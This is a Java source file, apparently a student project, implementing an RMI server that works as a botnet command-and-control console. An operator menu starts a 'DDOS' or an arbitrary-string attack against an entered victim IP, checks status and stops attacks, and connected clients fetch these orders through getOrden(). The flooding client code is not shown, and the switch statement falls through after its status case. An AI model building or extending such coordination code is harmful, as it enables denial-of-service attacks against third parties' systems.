import java.lang.invoke.MethodHandles.Lookup;
import java.rmi.AlreadyBoundException;
import java.rmi.NotBoundException;
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.ServerNotActiveException;
import java.rmi.server.UnicastRemoteObject;
import java.util.ArrayList;



public class RMIServer extends UnicastRemoteObject implements RMIServerI {

	private static final RMIClient RMIClienteI = null;
	private static String Mensaje;
	private static String ipVictima;
	private static String strArbitrario;
	static RMIServer serv;
	
	
	public String getMensaje() {
		return Mensaje;
	}
	public void setMensaje(String mensaje) {
		Mensaje = mensaje;
	}

	
	protected RMIServer() throws RemoteException {
		super();
		Mensaje = "";
		ipVictima = "";
		strArbitrario = "";
		// TODO Auto-generated constructor stub
	}
	/**
	 * @param args
	 * @throws RemoteException 
	 * @throws AlreadyBoundException 
	 * @throws NotBoundException 
	 * @throws InterruptedException 
	 * @throws ServerNotActiveException 
	 */
	public static void main(String[] args) throws RemoteException, AlreadyBoundException, NotBoundException, InterruptedException, ServerNotActiveException {
		 System.setProperty("java.security.policy", "file:/C:/Users/Backup_LABS/workspace/Trabajo_Avanzada/src/java.policy" );
		 
		System.setProperty("java.rmi.server.codebase", "file:/C:/Users/Backup_LABS/workspace/Trabajo_Avanzada/Trabajo_Avanzada/bin" );
		
		Registry reg = LocateRegistry.createRegistry(5555);
		serv = new RMIServer();
		reg.rebind("Tomas", serv);
		
		//Thread.sleep(30000);
		String opcion;
		
		while (true)
		{
			System.out.println("Iniciar DDOS (1)");
			System.out.println("Iniciar STRING (2)");
			System.out.println("ESTADOS (3)");
			System.out.println("PARAR ATAQUE (4)");
			
			opcion = Entrada.readLine();
		
			switch(opcion)
			{
				case "1" :  System.out.print("Ingrese IP a atacar: ");
							ipVictima = Entrada.readLine(); 
							Mensaje = "Iniciar DDOS";        
							break ;
				case "2":   System.out.print("Ingrese IP a atacar: ");
							ipVictima = Entrada.readLine();
							System.out.print("Ingrese el mensaje a hacer: "); 
							strArbitrario = Entrada.readLine();
							Mensaje = "Iniciar STRING";
							break;
				case "3": Mensaje = "Estado";
				
				case "4":   System.out.print("Ingrese IP a dejar de atacar: ");
							ipVictima = Entrada.readLine();
							Mensaje = "Parar";
									
			}
		}
	}
	
	public void imprimir(String s){
		try {
			this.setMensaje("Se conecto el " + serv.getClientHost());
			System.out.println(this.getMensaje());
			
			
		} catch (ServerNotActiveException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		System.out.println(s);
	}
	
	
	@Override
	public String getDatos() throws RemoteException {
		// TODO Auto-generated method stub
		 return this.getMensaje();
	}
	@Override
	
	public AccionCliente getOrden() throws RemoteException {
		AccionCliente a = new AccionCliente();
		a.setMensaje(Mensaje);
		a.setIpVictima(ipVictima);
		a.setStrArbitrario(strArbitrario);
		
		return a;
		
		
	}
	
	
	
	
	
}
